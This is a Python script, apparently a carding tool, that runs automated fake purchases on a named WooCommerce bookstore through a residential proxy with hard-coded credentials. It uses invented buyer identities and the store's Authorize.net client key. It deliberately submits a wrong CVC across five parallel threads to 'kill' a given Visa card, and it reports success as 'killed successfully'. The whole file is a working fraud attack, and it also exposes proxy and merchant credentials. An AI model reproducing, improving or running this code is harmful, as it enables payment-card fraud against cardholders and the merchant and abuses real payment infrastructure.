import asyncio
import threading
import queue
import httpx
import random
import json
from faker import Faker
import urllib.parse
import time
from user_agent import generate_user_agent

def get_usa_address():
    fake = Faker('en_US')
    full_name = fake.name().split()
    first_name = full_name[0]
    last_name = " ".join(full_name[1:]) if len(full_name) > 1 else ""

    address = {
        "first_name": first_name,
        "last_name": last_name,
        "address_line1": fake.street_address(),
        "city": fake.city(),
        "state": fake.state_abbr(),
        "zip": fake.zipcode(),
        "email" : fake.email()
    }
    return address

def get_number(exclude):
    numbers = [i for i in range(100, 1000) if i != exclude]
    return str(random.choice(numbers))

async def ck(cc:str):
    num,mm,yy,cvc = cc.split("|")
    if not num.startswith('4'):
        return 'Only Visa Card Allowed'
    if "20" not in yy:
        yy = f"20{yy}"
    yy1 = yy[2:]
    user = generate_user_agent()  # for headers
    user2 = urllib.parse.quote_plus(user)
    headers1 = {'user-agent': user}
    username = "sf30p9orymc24y0"
    password = "h5t0p437lspawbq"
    proxy = "http://{}:{}@rp.scrapegw.com:6060".format(username, password)
    transport = httpx.AsyncHTTPTransport(proxy=proxy)
    try:
        async with httpx.AsyncClient(transport=transport, timeout=30) as ses:
            await ses.get("https://stanzadeals.com/shop/",headers=headers1)
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://stanzadeals.com',
                'Referer': 'https://stanzadeals.com/books/administrative-procedure-and-practice/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            data = {
                'attribute_pa_condition': 'new',
                'quantity': '1',
                'add-to-cart': '16162',
                'product_id': '16162',
                'variation_id': '16402',
            }

            await ses.post(
                'https://stanzadeals.com/books/administrative-procedure-and-practice/',
                headers=headers,
                data=data,
            )
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://stanzadeals.com/books/administrative-procedure-and-practice/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            await ses.get('https://stanzadeals.com/cart/',headers=headers)
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Referer': 'https://stanzadeals.com/cart/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user,
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            chkout = await ses.get('https://stanzadeals.com/checkout/', headers=headers)
            print(chkout)
            text = chkout.text
            uron = text.split('"update_order_review_nonce":"')[1].split('"')[0]
            cpn = text.split('<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://stanzadeals.com',
                'Referer': 'https://stanzadeals.com/checkout/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            params = {
                'wc-ajax': 'update_order_review',
            }
            address = get_usa_address()
            fn = address['first_name']
            ln = address['last_name']
            add = address['address_line1']
            email = address['email']
            city = urllib.parse.quote('New York')
            en_street = add.replace(' ','+')
            en_email = urllib.parse.quote(email)
            post_data = {
                'security': str(uron),  # Fixed variable name from uron to uorn
                'payment_method': 'authnet',
                'country': 'US',
                'state': 'NY',
                'postcode': '10080',
                'city': 'New+York',
                'address': en_street,
                'address_2': '',
                's_country': 'US',
                's_state': 'NY',
                's_postcode': '10080',
                's_city': 'New+York',
                's_address': en_street,
                's_address_2': '',
                'has_full_address': 'true',
                'billing_first_name': fn,
                'billing_last_name': ln,
                'billing_email': email,
                'billing_phone': '577683673',
                'shipping_first_name': fn,
                'shipping_last_name': ln,
                'shipping_country': 'US',
                'shipping_state': 'NY',
                'shipping_postcode': '10080',
                'shipping_city': city.replace(' ', '+'),
                'shipping_address_1': en_street,
                'shipping_method[0]': 'flat_rate:4',
                'terms-field': '1',
                'woocommerce-process-checkout-nonce': cpn,
                '_wp_http_referer': f'/?wc-ajax=update_order_review&nocache={time.time()}'
            }

            # Convert to URL-encoded string
            data = urllib.parse.urlencode(post_data, doseq=True)

            uron = await ses.post('https://stanzadeals.com/', params=params, headers=headers, data=data)
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json; charset=UTF-8',
                'Origin': 'https://stanzadeals.com',
                'Referer': 'https://stanzadeals.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user,
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            json_data = {
                'securePaymentContainerRequest': {
                    'merchantAuthentication': {
                        'name': '2eGEv626',
                        'clientKey': '8f5F4SrsvaGbnb73CXTrbsH34a3vYxKCWeZAM5766PN4a7g4888yNSMfakLqd8BK',
                    },
                    'data': {
                        'type': 'TOKEN',
                        'id': '9de550ca-10d6-6c40-ec74-46e90979a3ad',
                        'token': {
                            'cardNumber': num,
                            'expirationDate': f'{mm}{yy1}',
                            'cardCode': get_number(cvc),
                            'fullName': 'ayush kumar',
                        },
                    },
                },
            }

            cctoken = await ses.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
            cctok = cctoken.text.split('"dataValue":"')[1].split('"')[0]
            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://stanzadeals.com',
                'Referer': 'https://stanzadeals.com/checkout/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fstanzadeals.com%2Fcart%2F&wc_order_attribution_session_start_time=2025-06-30+08%3A42%3A23&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_country=US&billing_address_1={en_street}&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080&billing_phone=5726548989&billing_email={en_email}&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NY&shipping_postcode=&shipping_phone=&order_comments=&shipping_method%5B0%5D=flat_rate%3A4&payment_method=authnet&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&authnet_nonce={cctok}&authnet_data_descriptor=COMMON.ACCEPT.INAPP.PAYMENT'

            response = await ses.post('https://stanzadeals.com/', params=params, headers=headers, data=data)
            print(response)
            return "killed successfully"
    except Exception as e:
        print(e)
        return f'Error ; {e}'
result_queue = queue.Queue()

def worker(cc: str):
    """Thread worker running async ck()"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(ck(cc))
        result_queue.put(result)
    except Exception as e:
        result_queue.put(f"Error: {str(e)}")
    finally:
        loop.close()

def pk1(cc: str, num_threads=5):
    """Run 5 threads on the same CC"""
    threads = []
    print(f"Processing {cc[:12]}... in {num_threads} threads")
    
    # Start threads
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(cc,))
        t.start()
        threads.append(t)
    
    # Wait for completion
    for t in threads:
        t.join()
    
    # Get results
    results = []
    while not result_queue.empty():
        results.append(result_queue.get())
    
    if 'killed successfully' in results:
        return "killed"
    else:
        return "failed"